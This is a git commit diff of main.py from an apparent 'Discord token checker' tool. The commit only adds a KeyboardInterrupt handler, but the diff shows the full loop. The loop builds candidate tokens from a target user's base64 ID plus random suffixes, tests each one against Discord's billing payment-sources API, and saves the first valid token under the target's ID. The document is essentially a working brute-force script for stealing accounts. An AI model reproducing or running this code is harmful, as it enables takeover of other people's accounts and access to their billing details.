2c63d7012f6676970fa6d13d706384e2a1a5b760
Venu2HD <83081969+Venu2HD@users.noreply.github.com>
2022-12-16 16:07:24 +0100

    Update main.py

--- main.py
+++ main.py
@@ -13,41 +13,47 @@ from rstr import xeger
 
 
 def main() -> None:
-    check_folders()
-    if name == "nt":
-        system("title DISCORD TOKEN CHECKER - Made by Venu2HD#1761")
-    SETTINGS: dict = get_config()
-    START_BASE64, TARGET_UUID = get_target_BASE64(clear_screen)
-    clear_screen()
-    while True:
-        full: str = f"{START_BASE64}.{'{}'}".format(
-            xeger("^[A-Z]{1}([a-zA-Z0-9]){5}\.([a-zA-Z0-9_-]{38})$")
-        )
-        with Session() as session:
-            response = session.get(
-                "http://discord.com/api/v9/users/@me/billing/payment-sources",
-                headers={"authorization": full},
+    try:
+        check_folders()
+        if name == "nt":
+            system("title DISCORD TOKEN CHECKER - Made by Venu2HD#1761")
+        SETTINGS: dict = get_config()
+        START_BASE64, TARGET_UUID = get_target_BASE64(clear_screen)
+        clear_screen()
+        while True:
+            full: str = f"{START_BASE64}.{'{}'}".format(
+                xeger("^[A-Z]{1}([a-zA-Z0-9]){5}\.([a-zA-Z0-9_-]{38})$")
             )
-            if response.status_code == 200:
-                write_result(TARGET_UUID, full)
-                clear_screen()
-                if name == "nt":
-                    input(
-                        f"{Fore.GREEN}TOKEN FOUND: {full}\nThis has also been written to:\n{getcwd()}\\results\\{TARGET_UUID}.txt{Fore.WHITE}\n"
-                    )
-                else:
-                    input(
-                        f"{Fore.GREEN}TOKEN FOUND: {full}\nThis has also been written to:\n{getcwd()}/results/{TARGET_UUID}.txt{Fore.WHITE}.txt\n"
-                    )
-                exit()
-            elif response.status_code == 401:
-                print(f"{Fore.RED}TESTED: {full}{Fore.WHITE}")
-            else:
-                print(
-                    f"{Fore.YELLOW}TIMEOUT FROM DISCORD API OR OTHER PROBLEM... WAITING {SETTINGS['timeout_in_seconds']}{Fore.WHITE}"
+            with Session() as session:
+                response = session.get(
+                    "http://discord.com/api/v9/users/@me/billing/payment-sources",
+                    headers={"authorization": full},
                 )
-                sleep(SETTINGS["timeout_in_seconds"])
+                if response.status_code == 200:
+                    write_result(TARGET_UUID, full)
+                    clear_screen()
+                    if name == "nt":
+                        input(
+                            f"{Fore.GREEN}TOKEN FOUND: {full}\nThis has also been written to:\n{getcwd()}\\results\\{TARGET_UUID}.txt{Fore.WHITE}\n"
+                        )
+                    else:
+                        input(
+                            f"{Fore.GREEN}TOKEN FOUND: {full}\nThis has also been written to:\n{getcwd()}/results/{TARGET_UUID}.txt{Fore.WHITE}.txt\n"
+                        )
+                    exit()
+                elif response.status_code == 401:
+                    print(f"{Fore.RED}TESTED: {full}{Fore.WHITE}")
+                else:
+                    print(
+                        f"{Fore.YELLOW}TIMEOUT FROM DISCORD API OR OTHER PROBLEM... WAITING {SETTINGS['timeout_in_seconds']}{Fore.WHITE}"
+                    )
+                    sleep(SETTINGS["timeout_in_seconds"])
+    except KeyboardInterrupt:
+        print("\n\n\nGOODBYE!")
+        sleep(3)
 
 
 if __name__ == "__main__":
     main()
+
+
